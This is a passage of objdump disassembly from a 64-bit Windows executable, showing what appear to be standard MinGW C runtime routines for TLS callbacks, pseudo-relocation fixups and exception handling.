   14000176d:	83 38 02             	cmpl   $0x2,(%rax)
   140001770:	74 06                	je     0x140001778
   140001772:	c7 00 02 00 00 00    	movl   $0x2,(%rax)
   140001778:	83 fa 01             	cmp    $0x1,%edx
   14000177b:	74 3c                	je     0x1400017b9
   14000177d:	83 fa 02             	cmp    $0x2,%edx
   140001780:	75 41                	jne    0x1400017c3
   140001782:	48 8d 35 ef 5c 01 00 	lea    0x15cef(%rip),%rsi        # 0x140017478
   140001789:	48 8d 3d e8 5c 01 00 	lea    0x15ce8(%rip),%rdi        # 0x140017478
   140001790:	48 39 f7             	cmp    %rsi,%rdi
   140001793:	75 14                	jne    0x1400017a9
   140001795:	eb 2c                	jmp    0x1400017c3
   140001797:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000179e:	00 00 
   1400017a0:	48 83 c7 08          	add    $0x8,%rdi
   1400017a4:	48 39 fe             	cmp    %rdi,%rsi
   1400017a7:	74 1a                	je     0x1400017c3
   1400017a9:	48 8b 07             	mov    (%rdi),%rax
   1400017ac:	48 85 c0             	test   %rax,%rax
   1400017af:	74 ef                	je     0x1400017a0
   1400017b1:	ff 15 51 08 51 00    	call   *0x510851(%rip)        # 0x140512008
   1400017b7:	eb e7                	jmp    0x1400017a0
   1400017b9:	ba 01 00 00 00       	mov    $0x1,%edx
   1400017be:	e8 1d 09 00 00       	call   0x1400020e0
   1400017c3:	b8 01 00 00 00       	mov    $0x1,%eax
   1400017c8:	48 83 c4 28          	add    $0x28,%rsp
   1400017cc:	5f                   	pop    %rdi
   1400017cd:	5e                   	pop    %rsi
   1400017ce:	c3                   	ret
   1400017cf:	90                   	nop
   1400017d0:	31 c0                	xor    %eax,%eax
   1400017d2:	c3                   	ret
   1400017d3:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   1400017da:	84 00 00 00 00 00 
   1400017e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400017e4:	83 fa 03             	cmp    $0x3,%edx
   1400017e7:	74 04                	je     0x1400017ed
   1400017e9:	85 d2                	test   %edx,%edx
   1400017eb:	75 05                	jne    0x1400017f2
   1400017ed:	e8 ee 08 00 00       	call   0x1400020e0
   1400017f2:	b8 01 00 00 00       	mov    $0x1,%eax
   1400017f7:	48 83 c4 28          	add    $0x28,%rsp
   1400017fb:	c3                   	ret
   1400017fc:	cc                   	int3
   1400017fd:	cc                   	int3
   1400017fe:	cc                   	int3
   1400017ff:	cc                   	int3
   140001800:	56                   	push   %rsi
   140001801:	57                   	push   %rdi
   140001802:	48 83 ec 38          	sub    $0x38,%rsp
   140001806:	48 89 ce             	mov    %rcx,%rsi
   140001809:	8b 01                	mov    (%rcx),%eax
   14000180b:	ff c8                	dec    %eax
   14000180d:	83 f8 05             	cmp    $0x5,%eax
   140001810:	77 12                	ja     0x140001824
   140001812:	48 98                	cltq
   140001814:	48 8d 0d d1 29 01 00 	lea    0x129d1(%rip),%rcx        # 0x1400141ec
   14000181b:	48 63 3c 81          	movslq (%rcx,%rax,4),%rdi
   14000181f:	48 01 cf             	add    %rcx,%rdi
   140001822:	eb 07                	jmp    0x14000182b
   140001824:	48 8d 3d 86 29 01 00 	lea    0x12986(%rip),%rdi        # 0x1400141b1
   14000182b:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001830:	e8 5b 0a 00 00       	call   0x140002290
   140001835:	4c 8b 4e 08          	mov    0x8(%rsi),%r9
   140001839:	0f 10 46 10          	movups 0x10(%rsi),%xmm0
   14000183d:	f2 0f 10 4e 20       	movsd  0x20(%rsi),%xmm1
   140001842:	f2 0f 11 4c 24 30    	movsd  %xmm1,0x30(%rsp)
   140001848:	0f 11 44 24 20       	movups %xmm0,0x20(%rsp)
   14000184d:	48 8d 15 6b 29 01 00 	lea    0x1296b(%rip),%rdx        # 0x1400141bf
   140001854:	48 89 c1             	mov    %rax,%rcx
   140001857:	49 89 f8             	mov    %rdi,%r8
   14000185a:	e8 71 17 01 00       	call   0x140012fd0
   14000185f:	31 c0                	xor    %eax,%eax
   140001861:	48 83 c4 38          	add    $0x38,%rsp
   140001865:	5f                   	pop    %rdi
   140001866:	5e                   	pop    %rsi
   140001867:	c3                   	ret
   140001868:	cc                   	int3
   140001869:	cc                   	int3
   14000186a:	cc                   	int3
   14000186b:	cc                   	int3
   14000186c:	cc                   	int3
   14000186d:	cc                   	int3
   14000186e:	cc                   	int3
   14000186f:	cc                   	int3
   140001870:	db e3                	fninit
   140001872:	c3                   	ret
   140001873:	cc                   	int3
   140001874:	cc                   	int3
   140001875:	cc                   	int3
   140001876:	cc                   	int3
   140001877:	cc                   	int3
   140001878:	cc                   	int3
   140001879:	cc                   	int3
   14000187a:	cc                   	int3
   14000187b:	cc                   	int3
   14000187c:	cc                   	int3
   14000187d:	cc                   	int3
   14000187e:	cc                   	int3
   14000187f:	cc                   	int3
   140001880:	55                   	push   %rbp
   140001881:	41 57                	push   %r15
   140001883:	41 56                	push   %r14
   140001885:	41 55                	push   %r13
   140001887:	41 54                	push   %r12
   140001889:	56                   	push   %rsi
   14000188a:	57                   	push   %rdi
   14000188b:	53                   	push   %rbx
   14000188c:	48 83 ec 18          	sub    $0x18,%rsp
   140001890:	48 8d 6c 24 10       	lea    0x10(%rsp),%rbp
   140001895:	80 3d 04 c4 50 00 00 	cmpb   $0x0,0x50c404(%rip)        # 0x14050dca0
   14000189c:	0f 85 6d 01 00 00    	jne    0x140001a0f
   1400018a2:	c6 05 f7 c3 50 00 01 	movb   $0x1,0x50c3f7(%rip)        # 0x14050dca0
   1400018a9:	48 83 ec 20          	sub    $0x20,%rsp
   1400018ad:	e8 6e 0b 00 00       	call   0x140002420
   1400018b2:	48 83 c4 20          	add    $0x20,%rsp
   1400018b6:	48 98                	cltq
   1400018b8:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   1400018bc:	48 8d 04 c5 0f 00 00 	lea    0xf(,%rax,8),%rax
   1400018c3:	00 
   1400018c4:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   1400018c8:	e8 93 0d 00 00       	call   0x140002660
   1400018cd:	48 29 c4             	sub    %rax,%rsp
   1400018d0:	48 89 e0             	mov    %rsp,%rax
   1400018d3:	48 89 05 ce c3 50 00 	mov    %rax,0x50c3ce(%rip)        # 0x14050dca8
   1400018da:	c7 05 cc c3 50 00 00 	movl   $0x0,0x50c3cc(%rip)        # 0x14050dcb0
   1400018e1:	00 00 00 
   1400018e4:	48 8b 3d c5 2a 01 00 	mov    0x12ac5(%rip),%rdi        # 0x1400143b0
   1400018eb:	48 89 f8             	mov    %rdi,%rax
   1400018ee:	48 2b 05 c3 2a 01 00 	sub    0x12ac3(%rip),%rax        # 0x1400143b8
   1400018f5:	48 83 f8 07          	cmp    $0x7,%rax
   1400018f9:	0f 8e 10 01 00 00    	jle    0x140001a0f
   1400018ff:	48 8b 1d b2 2a 01 00 	mov    0x12ab2(%rip),%rbx        # 0x1400143b8
   140001906:	48 89 f8             	mov    %rdi,%rax
   140001909:	48 29 d8             	sub    %rbx,%rax
   14000190c:	48 83 f8 0c          	cmp    $0xc,%rax
   140001910:	7c 2c                	jl     0x14000193e
   140001912:	48 8b 1d 9f 2a 01 00 	mov    0x12a9f(%rip),%rbx        # 0x1400143b8
   140001919:	83 3b 00             	cmpl   $0x0,(%rbx)
   14000191c:	75 2f                	jne    0x14000194d
   14000191e:	48 8b 1d 93 2a 01 00 	mov    0x12a93(%rip),%rbx        # 0x1400143b8
   140001925:	83 7b 04 00          	cmpl   $0x0,0x4(%rbx)
   140001929:	75 22                	jne    0x14000194d
   14000192b:	48 8b 05 86 2a 01 00 	mov    0x12a86(%rip),%rax        # 0x1400143b8
   140001932:	48 8d 58 0c          	lea    0xc(%rax),%rbx
   140001936:	83 78 08 00          	cmpl   $0x0,0x8(%rax)
   14000193a:	48 0f 45 d8          	cmovne %rax,%rbx
   14000193e:	83 3b 00             	cmpl   $0x0,(%rbx)
   140001941:	75 0a                	jne    0x14000194d
   140001943:	83 7b 04 00          	cmpl   $0x0,0x4(%rbx)
   140001947:	0f 84 d3 00 00 00    	je     0x140001a20
   14000194d:	48 3b 1d 5c 2a 01 00 	cmp    0x12a5c(%rip),%rbx        # 0x1400143b0
   140001954:	73 48                	jae    0x14000199e
   140001956:	4c 8b 35 ab 26 01 00 	mov    0x126ab(%rip),%r14        # 0x140014008
   14000195d:	48 8d 75 04          	lea    0x4(%rbp),%rsi
   140001961:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140001968:	0f 1f 84 00 00 00 00 
   14000196f:	00 
   140001970:	8b 03                	mov    (%rbx),%eax
   140001972:	8b 4b 04             	mov    0x4(%rbx),%ecx
   140001975:	42 03 04 31          	add    (%rcx,%r14,1),%eax
   140001979:	4c 01 f1             	add    %r14,%rcx
   14000197c:	89 45 04             	mov    %eax,0x4(%rbp)
   14000197f:	48 83 ec 20          	sub    $0x20,%rsp
   140001983:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140001989:	48 89 f2             	mov    %rsi,%rdx
   14000198c:	e8 0f 02 00 00       	call   0x140001ba0
   140001991:	48 83 c4 20          	add    $0x20,%rsp
   140001995:	48 83 c3 08          	add    $0x8,%rbx
   140001999:	48 39 fb             	cmp    %rdi,%rbx
   14000199c:	72 d2                	jb     0x140001970
   14000199e:	8b 05 0c c3 50 00    	mov    0x50c30c(%rip),%eax        # 0x14050dcb0
   1400019a4:	85 c0                	test   %eax,%eax
   1400019a6:	7e 67                	jle    0x140001a0f
   1400019a8:	bf 10 00 00 00       	mov    $0x10,%edi
   1400019ad:	48 8b 15 f4 c2 50 00 	mov    0x50c2f4(%rip),%rdx        # 0x14050dca8
   1400019b4:	31 db                	xor    %ebx,%ebx
   1400019b6:	48 8d 75 f8          	lea    -0x8(%rbp),%rsi
   1400019ba:	4c 8b 35 2f 5e 01 00 	mov    0x15e2f(%rip),%r14        # 0x1400177f0
   1400019c1:	eb 1c                	jmp    0x1400019df
   1400019c3:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   1400019ca:	84 00 00 00 00 00 
   1400019d0:	48 ff c3             	inc    %rbx
   1400019d3:	48 63 c8             	movslq %eax,%rcx
   1400019d6:	48 83 c7 28          	add    $0x28,%rdi
   1400019da:	48 39 cb             	cmp    %rcx,%rbx
   1400019dd:	7d 30                	jge    0x140001a0f
   1400019df:	44 8b 44 3a f0       	mov    -0x10(%rdx,%rdi,1),%r8d
   1400019e4:	45 85 c0             	test   %r8d,%r8d
   1400019e7:	74 e7                	je     0x1400019d0
   1400019e9:	48 8b 4c 3a f8       	mov    -0x8(%rdx,%rdi,1),%rcx
   1400019ee:	48 8b 14 3a          	mov    (%rdx,%rdi,1),%rdx
   1400019f2:	48 83 ec 20          	sub    $0x20,%rsp
   1400019f6:	49 89 f1             	mov    %rsi,%r9
   1400019f9:	41 ff d6             	call   *%r14
   1400019fc:	48 83 c4 20          	add    $0x20,%rsp
   140001a00:	48 8b 15 a1 c2 50 00 	mov    0x50c2a1(%rip),%rdx        # 0x14050dca8
   140001a07:	8b 05 a3 c2 50 00    	mov    0x50c2a3(%rip),%eax        # 0x14050dcb0
   140001a0d:	eb c1                	jmp    0x1400019d0
   140001a0f:	48 8d 65 08          	lea    0x8(%rbp),%rsp
   140001a13:	5b                   	pop    %rbx
   140001a14:	5f                   	pop    %rdi
   140001a15:	5e                   	pop    %rsi
   140001a16:	41 5c                	pop    %r12
   140001a18:	41 5d                	pop    %r13
   140001a1a:	41 5e                	pop    %r14
   140001a1c:	41 5f                	pop    %r15
   140001a1e:	5d                   	pop    %rbp
   140001a1f:	c3                   	ret
   140001a20:	8b 53 08             	mov    0x8(%rbx),%edx
   140001a23:	83 fa 01             	cmp    $0x1,%edx
   140001a26:	0f 85 5b 01 00 00    	jne    0x140001b87
   140001a2c:	48 83 c3 0c          	add    $0xc,%rbx
   140001a30:	48 3b 1d 79 29 01 00 	cmp    0x12979(%rip),%rbx        # 0x1400143b0
   140001a37:	0f 83 61 ff ff ff    	jae    0x14000199e
   140001a3d:	4c 8b 35 c4 25 01 00 	mov    0x125c4(%rip),%r14        # 0x140014008
   140001a44:	4c 8d 3d bd 27 01 00 	lea    0x127bd(%rip),%r15        # 0x140014208
   140001a4b:	41 bc 8b 00 00 00    	mov    $0x8b,%r12d
   140001a51:	48 8d 75 f8          	lea    -0x8(%rbp),%rsi
   140001a55:	49 bd 00 00 00 00 ff 	movabs $0xffffffff00000000,%r13
   140001a5c:	ff ff ff 
   140001a5f:	eb 1c                	jmp    0x140001a7d
   140001a61:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140001a68:	0f 1f 84 00 00 00 00 
   140001a6f:	00 
   140001a70:	48 83 c3 0c          	add    $0xc,%rbx
   140001a74:	48 39 fb             	cmp    %rdi,%rbx
   140001a77:	0f 83 21 ff ff ff    	jae    0x14000199e
   140001a7d:	8b 4b 08             	mov    0x8(%rbx),%ecx
   140001a80:	41 89 c8             	mov    %ecx,%r8d
   140001a83:	41 81 e0 f8 00 00 00 	and    $0xf8,%r8d
   140001a8a:	41 83 c0 f8          	add    $0xfffffff8,%r8d
   140001a8e:	41 0f ac c8 03       	shrd   $0x3,%ecx,%r8d
   140001a93:	41 83 f8 07          	cmp    $0x7,%r8d
   140001a97:	0f 87 d7 00 00 00    	ja     0x140001b74
   140001a9d:	8b 13                	mov    (%rbx),%edx
   140001a9f:	8b 43 04             	mov    0x4(%rbx),%eax
   140001aa2:	4c 01 f0             	add    %r14,%rax
   140001aa5:	4e 8b 0c 32          	mov    (%rdx,%r14,1),%r9
   140001aa9:	4f 63 14 87          	movslq (%r15,%r8,4),%r10
   140001aad:	4d 01 fa             	add    %r15,%r10
   140001ab0:	41 ff e2             	jmp    *%r10
   140001ab3:	44 0f b6 18          	movzbl (%rax),%r11d
   140001ab7:	4d 8d 93 00 ff ff ff 	lea    -0x100(%r11),%r10
   140001abe:	45 84 db             	test   %r11b,%r11b
   140001ac1:	eb 1b                	jmp    0x140001ade
   140001ac3:	44 0f b7 18          	movzwl (%rax),%r11d
   140001ac7:	4d 8d 93 00 00 ff ff 	lea    -0x10000(%r11),%r10
   140001ace:	66 45 85 db          	test   %r11w,%r11w
   140001ad2:	eb 0a                	jmp    0x140001ade
   140001ad4:	44 8b 18             	mov    (%rax),%r11d
   140001ad7:	4f 8d 14 2b          	lea    (%r11,%r13,1),%r10
   140001adb:	45 85 db             	test   %r11d,%r11d
   140001ade:	4d 0f 49 d3          	cmovns %r11,%r10
   140001ae2:	eb 03                	jmp    0x140001ae7
   140001ae4:	4c 8b 10             	mov    (%rax),%r10
   140001ae7:	4c 01 f2             	add    %r14,%rdx
   140001aea:	49 29 d2             	sub    %rdx,%r10
   140001aed:	4d 01 ca             	add    %r9,%r10
   140001af0:	4c 89 55 f8          	mov    %r10,-0x8(%rbp)
   140001af4:	0f b6 d1             	movzbl %cl,%edx
   140001af7:	83 fa 3f             	cmp    $0x3f,%edx
   140001afa:	77 26                	ja     0x140001b22
   140001afc:	49 c7 c3 ff ff ff ff 	mov    $0xffffffffffffffff,%r11
   140001b03:	89 d1                	mov    %edx,%ecx
   140001b05:	49 d3 e3             	shl    %cl,%r11
   140001b08:	49 f7 d3             	not    %r11
   140001b0b:	4d 39 da             	cmp    %r11,%r10
   140001b0e:	7f 4c                	jg     0x140001b5c
   140001b10:	8d 4a ff             	lea    -0x1(%rdx),%ecx
   140001b13:	49 c7 c3 ff ff ff ff 	mov    $0xffffffffffffffff,%r11
   140001b1a:	49 d3 e3             	shl    %cl,%r11
   140001b1d:	4d 39 da             	cmp    %r11,%r10
   140001b20:	7c 3a                	jl     0x140001b5c
   140001b22:	41 83 f8 07          	cmp    $0x7,%r8d
   140001b26:	0f 87 44 ff ff ff    	ja     0x140001a70
   140001b2c:	45 0f a3 c4          	bt     %r8d,%r12d
   140001b30:	0f 83 3a ff ff ff    	jae    0x140001a70
   140001b36:	49 63 c8             	movslq %r8d,%rcx
   140001b39:	48 8d 15 30 28 01 00 	lea    0x12830(%rip),%rdx        # 0x140014370
   140001b40:	4c 8b 04 ca          	mov    (%rdx,%rcx,8),%r8
   140001b44:	48 83 ec 20          	sub    $0x20,%rsp
   140001b48:	48 89 c1             	mov    %rax,%rcx
   140001b4b:	48 89 f2             	mov    %rsi,%rdx
   140001b4e:	e8 4d 00 00 00       	call   0x140001ba0
   140001b53:	48 83 c4 20          	add    $0x20,%rsp
   140001b57:	e9 14 ff ff ff       	jmp    0x140001a70
   140001b5c:	48 83 ec 30          	sub    $0x30,%rsp
   140001b60:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   140001b65:	48 8d 0d 18 27 01 00 	lea    0x12718(%rip),%rcx        # 0x140014284
   140001b6c:	49 89 c0             	mov    %rax,%r8
   140001b6f:	e8 cc 01 00 00       	call   0x140001d40
   140001b74:	0f b6 d1             	movzbl %cl,%edx
   140001b77:	48 83 ec 20          	sub    $0x20,%rsp
   140001b7b:	48 8d 0d d8 26 01 00 	lea    0x126d8(%rip),%rcx        # 0x14001425a
   140001b82:	e8 b9 01 00 00       	call   0x140001d40
   140001b87:	48 83 ec 20          	sub    $0x20,%rsp
   140001b8b:	48 8d 0d 96 26 01 00 	lea    0x12696(%rip),%rcx        # 0x140014228
   140001b92:	e8 a9 01 00 00       	call   0x140001d40
   140001b97:	cc                   	int3
   140001b98:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140001b9f:	00 
   140001ba0:	41 57                	push   %r15
   140001ba2:	41 56                	push   %r14
   140001ba4:	41 54                	push   %r12
   140001ba6:	56                   	push   %rsi
   140001ba7:	57                   	push   %rdi
   140001ba8:	53                   	push   %rbx
   140001ba9:	48 83 ec 58          	sub    $0x58,%rsp
   140001bad:	4c 89 c7             	mov    %r8,%rdi
   140001bb0:	48 89 d3             	mov    %rdx,%rbx
   140001bb3:	48 89 ce             	mov    %rcx,%rsi
   140001bb6:	44 8b 3d f3 c0 50 00 	mov    0x50c0f3(%rip),%r15d        # 0x14050dcb0
   140001bbd:	45 85 ff             	test   %r15d,%r15d
   140001bc0:	7e 47                	jle    0x140001c09
   140001bc2:	48 8b 05 df c0 50 00 	mov    0x50c0df(%rip),%rax        # 0x14050dca8
   140001bc9:	4a 8d 0c fd 00 00 00 	lea    0x0(,%r15,8),%rcx
   140001bd0:	00 
   140001bd1:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
   140001bd5:	31 d2                	xor    %edx,%edx
   140001bd7:	eb 10                	jmp    0x140001be9
   140001bd9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001be0:	48 83 c2 28          	add    $0x28,%rdx
   140001be4:	48 39 d1             	cmp    %rdx,%rcx
   140001be7:	74 23                	je     0x140001c0c
   140001be9:	4c 8b 44 10 18       	mov    0x18(%rax,%rdx,1),%r8
   140001bee:	49 39 f0             	cmp    %rsi,%r8
   140001bf1:	77 ed                	ja     0x140001be0
   140001bf3:	4c 8b 4c 10 20       	mov    0x20(%rax,%rdx,1),%r9
   140001bf8:	45 8b 49 08          	mov    0x8(%r9),%r9d
   140001bfc:	4d 01 c8             	add    %r9,%r8
   140001bff:	49 39 f0             	cmp    %rsi,%r8
   140001c02:	76 dc                	jbe    0x140001be0
   140001c04:	e9 ce 00 00 00       	jmp    0x140001cd7
   140001c09:	45 31 ff             	xor    %r15d,%r15d
   140001c0c:	48 89 f1             	mov    %rsi,%rcx
   140001c0f:	e8 9c 07 00 00       	call   0x1400023b0
   140001c14:	48 85 c0             	test   %rax,%rax
   140001c17:	0f 84 d7 00 00 00    	je     0x140001cf4
   140001c1d:	49 89 c6             	mov    %rax,%r14
   140001c20:	48 8b 05 81 c0 50 00 	mov    0x50c081(%rip),%rax        # 0x14050dca8
   140001c27:	4a 8d 0c fd 00 00 00 	lea    0x0(,%r15,8),%rcx
   140001c2e:	00 
   140001c2f:	4c 8d 24 89          	lea    (%rcx,%rcx,4),%r12
   140001c33:	4e 89 74 20 20       	mov    %r14,0x20(%rax,%r12,1)
   140001c38:	42 c7 04 20 00 00 00 	movl   $0x0,(%rax,%r12,1)
   140001c3f:	00 
   140001c40:	e8 8b 08 00 00       	call   0x1400024d0
   140001c45:	41 8b 4e 0c          	mov    0xc(%r14),%ecx
   140001c49:	48 01 c1             	add    %rax,%rcx
   140001c4c:	48 8b 05 55 c0 50 00 	mov    0x50c055(%rip),%rax        # 0x14050dca8
   140001c53:	4a 89 4c 20 18       	mov    %rcx,0x18(%rax,%r12,1)
   140001c58:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   140001c5d:	41 b8 30 00 00 00    	mov    $0x30,%r8d
   140001c63:	ff 15 8f 5b 01 00    	call   *0x15b8f(%rip)        # 0x1400177f8
   140001c69:	48 85 c0             	test   %rax,%rax
   140001c6c:	0f 84 91 00 00 00    	je     0x140001d03
   140001c72:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   140001c76:	83 f8 07             	cmp    $0x7,%eax
   140001c79:	7e 13                	jle    0x140001c8e
   140001c7b:	83 f8 08             	cmp    $0x8,%eax
   140001c7e:	74 51                	je     0x140001cd1
   140001c80:	83 f8 40             	cmp    $0x40,%eax
   140001c83:	74 4c                	je     0x140001cd1
   140001c85:	3d 80 00 00 00       	cmp    $0x80,%eax
   140001c8a:	74 45                	je     0x140001cd1
   140001c8c:	eb 10                	jmp    0x140001c9e
   140001c8e:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140001c94:	83 f8 02             	cmp    $0x2,%eax
   140001c97:	74 0b                	je     0x140001ca4
   140001c99:	83 f8 04             	cmp    $0x4,%eax
   140001c9c:	74 33                	je     0x140001cd1
   140001c9e:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140001ca4:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140001ca9:	48 8b 05 f8 bf 50 00 	mov    0x50bff8(%rip),%rax        # 0x14050dca8
   140001cb0:	4f 8d 14 bf          	lea    (%r15,%r15,4),%r10
   140001cb4:	4e 8d 0c d0          	lea    (%rax,%r10,8),%r9
   140001cb8:	4a 89 4c d0 08       	mov    %rcx,0x8(%rax,%r10,8)
   140001cbd:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   140001cc2:	4a 89 54 d0 10       	mov    %rdx,0x10(%rax,%r10,8)
   140001cc7:	ff 15 23 5b 01 00    	call   *0x15b23(%rip)        # 0x1400177f0
   140001ccd:	85 c0                	test   %eax,%eax
   140001ccf:	74 52                	je     0x140001d23
   140001cd1:	ff 05 d9 bf 50 00    	incl   0x50bfd9(%rip)        # 0x14050dcb0
   140001cd7:	48 89 f1             	mov    %rsi,%rcx
   140001cda:	48 89 da             	mov    %rbx,%rdx
   140001cdd:	49 89 f8             	mov    %rdi,%r8
   140001ce0:	e8 4b 12 01 00       	call   0x140012f30
   140001ce5:	90                   	nop
   140001ce6:	48 83 c4 58          	add    $0x58,%rsp
   140001cea:	5b                   	pop    %rbx
   140001ceb:	5f                   	pop    %rdi
   140001cec:	5e                   	pop    %rsi
   140001ced:	41 5c                	pop    %r12
   140001cef:	41 5e                	pop    %r14
   140001cf1:	41 5f                	pop    %r15
   140001cf3:	c3                   	ret
   140001cf4:	48 8d 0d dc 25 01 00 	lea    0x125dc(%rip),%rcx        # 0x1400142d7
   140001cfb:	48 89 f2             	mov    %rsi,%rdx
   140001cfe:	e8 3d 00 00 00       	call   0x140001d40
   140001d03:	41 8b 56 08          	mov    0x8(%r14),%edx
   140001d07:	48 8b 05 9a bf 50 00 	mov    0x50bf9a(%rip),%rax        # 0x14050dca8
   140001d0e:	4b 8d 0c bf          	lea    (%r15,%r15,4),%rcx
   140001d12:	4c 8b 44 c8 18       	mov    0x18(%rax,%rcx,8),%r8
   140001d17:	48 8d 0d d9 25 01 00 	lea    0x125d9(%rip),%rcx        # 0x1400142f7
   140001d1e:	e8 1d 00 00 00       	call   0x140001d40
   140001d23:	ff 15 97 5a 01 00    	call   *0x15a97(%rip)        # 0x1400177c0
   140001d29:	48 8d 0d f8 25 01 00 	lea    0x125f8(%rip),%rcx        # 0x140014328
   140001d30:	89 c2                	mov    %eax,%edx
   140001d32:	e8 09 00 00 00       	call   0x140001d40
   140001d37:	cc                   	int3
   140001d38:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140001d3f:	00 
   140001d40:	56                   	push   %rsi
   140001d41:	48 83 ec 30          	sub    $0x30,%rsp
   140001d45:	48 89 ce             	mov    %rcx,%rsi
   140001d48:	48 89 54 24 48       	mov    %rdx,0x48(%rsp)
   140001d4d:	4c 89 44 24 50       	mov    %r8,0x50(%rsp)
   140001d52:	4c 89 4c 24 58       	mov    %r9,0x58(%rsp)
   140001d57:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   140001d5c:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001d61:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001d66:	e8 25 05 00 00       	call   0x140002290
   140001d6b:	48 8d 0d dd 25 01 00 	lea    0x125dd(%rip),%rcx        # 0x14001434f
   140001d72:	ba 1b 00 00 00       	mov    $0x1b,%edx
   140001d77:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001d7d:	49 89 c1             	mov    %rax,%r9
   140001d80:	e8 5b 12 01 00       	call   0x140012fe0
   140001d85:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001d8a:	e8 01 05 00 00       	call   0x140002290
   140001d8f:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   140001d94:	48 89 c1             	mov    %rax,%rcx
   140001d97:	48 89 f2             	mov    %rsi,%rdx
   140001d9a:	e8 51 12 01 00       	call   0x140012ff0
   140001d9f:	e8 5c 12 01 00       	call   0x140013000
   140001da4:	cc                   	int3
   140001da5:	cc                   	int3
   140001da6:	cc                   	int3
   140001da7:	cc                   	int3
   140001da8:	cc                   	int3
   140001da9:	cc                   	int3
   140001daa:	cc                   	int3
   140001dab:	cc                   	int3
   140001dac:	cc                   	int3
   140001dad:	cc                   	int3
   140001dae:	cc                   	int3
   140001daf:	cc                   	int3
   140001db0:	48 83 ec 48          	sub    $0x48,%rsp
   140001db4:	48 8b 05 fd be 50 00 	mov    0x50befd(%rip),%rax        # 0x14050dcb8
   140001dbb:	48 85 c0             	test   %rax,%rax
   140001dbe:	74 2c                	je     0x140001dec
   140001dc0:	f2 0f 10 44 24 70    	movsd  0x70(%rsp),%xmm0
   140001dc6:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   140001dca:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   140001dcf:	f2 0f 11 54 24 30    	movsd  %xmm2,0x30(%rsp)
   140001dd5:	f2 0f 11 5c 24 38    	movsd  %xmm3,0x38(%rsp)
   140001ddb:	f2 0f 11 44 24 40    	movsd  %xmm0,0x40(%rsp)
   140001de1:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001de6:	ff 15 1c 02 51 00    	call   *0x51021c(%rip)        # 0x140512008
   140001dec:	90                   	nop
   140001ded:	48 83 c4 48          	add    $0x48,%rsp
   140001df1:	c3                   	ret
   140001df2:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140001df9:	1f 84 00 00 00 00 00 
   140001e00:	48 89 0d b1 be 50 00 	mov    %rcx,0x50beb1(%rip)        # 0x14050dcb8
   140001e07:	e9 04 12 01 00       	jmp    0x140013010
   140001e0c:	cc                   	int3
   140001e0d:	cc                   	int3
   140001e0e:	cc                   	int3
   140001e0f:	cc                   	int3
   140001e10:	56                   	push   %rsi
   140001e11:	57                   	push   %rdi
   140001e12:	53                   	push   %rbx
   140001e13:	48 83 ec 20          	sub    $0x20,%rsp
   140001e17:	48 89 cf             	mov    %rcx,%rdi
   140001e1a:	48 8b 09             	mov    (%rcx),%rcx
   140001e1d:	8b 01                	mov    (%rcx),%eax
   140001e1f:	89 c2                	mov    %eax,%edx
   140001e21:	81 e2 ff ff ff 20    	and    $0x20ffffff,%edx
   140001e27:	81 fa 43 43 47 20    	cmp    $0x20474343,%edx
   140001e2d:	75 0f                	jne    0x140001e3e
   140001e2f:	be ff ff ff ff       	mov    $0xffffffff,%esi
   140001e34:	f6 41 04 01          	testb  $0x1,0x4(%rcx)
   140001e38:	0f 84 22 01 00 00    	je     0x140001f60
   140001e3e:	be ff ff ff ff       	mov    $0xffffffff,%esi
   140001e43:	3d 1c 00 00 c0       	cmp    $0xc000001c,%eax
   140001e48:	7e 59                	jle    0x140001ea3
   140001e4a:	8d 88 74 ff ff 3f    	lea    0x3fffff74(%rax),%ecx
   140001e50:	83 f9 0a             	cmp    $0xa,%ecx
   140001e53:	77 77                	ja     0x140001ecc
   140001e55:	48 8d 05 64 25 01 00 	lea    0x12564(%rip),%rax        # 0x1400143c0
   140001e5c:	48 63 0c 88          	movslq (%rax,%rcx,4),%rcx
   140001e60:	48 01 c1             	add    %rax,%rcx
   140001e63:	ff e1                	jmp    *%rcx
   140001e65:	31 db                	xor    %ebx,%ebx
   140001e67:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001e6c:	31 d2                	xor    %edx,%edx
   140001e6e:	e8 ad 11 01 00       	call   0x140013020
   140001e73:	48 85 c0             	test   %rax,%rax
   140001e76:	0f 84 a7 00 00 00    	je     0x140001f23
   140001e7c:	48 83 f8 01          	cmp    $0x1,%rax
   140001e80:	75 40                	jne    0x140001ec2
   140001e82:	ba 01 00 00 00       	mov    $0x1,%edx
   140001e87:	b9 08 00 00 00       	mov    $0x8,%ecx
